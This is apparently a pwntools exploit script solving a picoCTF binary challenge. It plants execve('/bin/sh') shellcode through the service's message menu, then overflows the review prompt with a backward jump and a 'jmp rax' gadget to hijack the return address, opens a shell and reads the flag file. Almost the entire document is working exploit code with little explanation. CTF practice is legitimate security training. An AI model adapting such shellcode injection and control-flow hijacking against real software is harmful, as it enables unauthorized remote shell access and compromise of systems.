from pwn import *

# Set up the connection
context.arch = 'amd64'
context.log_level = 'critical'

p = remote('shape-facility.picoctf.net', 49983)

# execute /bin/sh shellcode
shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
# jmp rax address
jmp_rax = 0x40116c
# jmp -721 shellcode
jmp_bytes = b'\xe9\x2f\xfd\xff\xff'

# Inject shellcode
p.sendlineafter(b'3. Exit the app\n', b'1')
p.sendlineafter(b"What's the new recipient's name: \n", b"\x90" * 8) 

p.sendlineafter(b'3. Exit the app\n', b'2')
p.sendlineafter(b'Which recipient would you like to send a message to?\n', b'0')
p.sendlineafter(b'What message would you like to send them?\n', shellcode)

# Add jmp -721 bytes code (to jump to shellcode) and some padding
payload = jmp_bytes + b'B' * 7 + b'C' * 8
# Overwrite return address with jmp rax gadget
payload += p64(jmp_rax) 

p.sendlineafter(b'3. Exit the app\n', b'3')
p.sendlineafter(b'If you could take a second to write a quick review, we would really appreciate it: \n', payload)

# Access shell
p.sendline(b'cat flag.txt')
flag = p.recvall(timeout=0.5).decode()
print(flag)